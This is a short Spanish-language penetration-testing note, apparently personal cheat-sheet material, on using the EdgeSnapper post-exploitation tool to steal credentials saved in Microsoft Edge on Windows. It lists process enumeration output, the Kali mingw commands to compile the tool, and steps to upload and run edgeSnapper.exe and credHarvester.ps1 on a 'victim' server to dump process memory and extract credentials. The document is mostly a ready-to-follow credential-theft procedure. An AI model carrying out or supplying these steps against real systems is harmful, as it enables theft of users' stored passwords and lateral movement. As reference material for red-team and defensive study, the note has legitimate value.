# Edge Snapper 

Tags: #Windows #PrivEsc #MovimientoLateral #EdgeSnapper 

EdgeSnapper es una herramienta de post-explotación que extrae credenciales de navegadores y memoria en Windows. **EdgeSnapper extrae las que están guardadas** (descifra la encriptación DPAPI de Windows).

## Reconocimiento 

```bash 
# Enumerar procesos y ver que EDGE se esta ejecutando para poder utilizarlo 
❯ Get-Process

	188      10     2808      16328       0.05   1684   1 msedge
    283      22    25256      60860       0.38   1732   1 msedge
    227      13     9380      27884       0.19   2948   1 msedge
    397      23    15788      43892       1.38   3860   1 msedge
    221      18    21984      39184       0.13   4236   1 msedge
    183      10     9492      22596       0.17   5632   1 msedge
   1519     751    59760     167288       3.55   6856   1 msedge
    322      18    13356      38120       0.42   7020   1 msedge
```

## Edge Snapper 
* [EdgeSnapper](https://github.com/Dragkob/EdgeSnapper)

```bash 
# Instalar librerias en Kali 
Paso 1:
❯ sudo apt install x86_64-w64-mingw32-g++   

# Instala las librerías faltantes
❯ sudo apt-get install mingw-w64 mingw-w64-tools mingw-w64-common
```

```powershell
Paso 2: 
# Compilar en Kali desde el dir 'EdgeSnapper/PathAlpa' 
❯ x86_64-w64-mingw32-g++ edgeSnapperOnDisk.cpp -o edgeSnapper.exe -static -static-libgcc -static-libstdc++ -ldbghelp -lpsapi
```

```powershell 
Paso 3:
# Subir y ejecutar en el server Windows víctima 
❯ .\edgeSnapper.exe    # Generar el dump 'edge_snapped.dmp' 
❯ .\credHarvester.ps1  # Extraer las credenciales 
```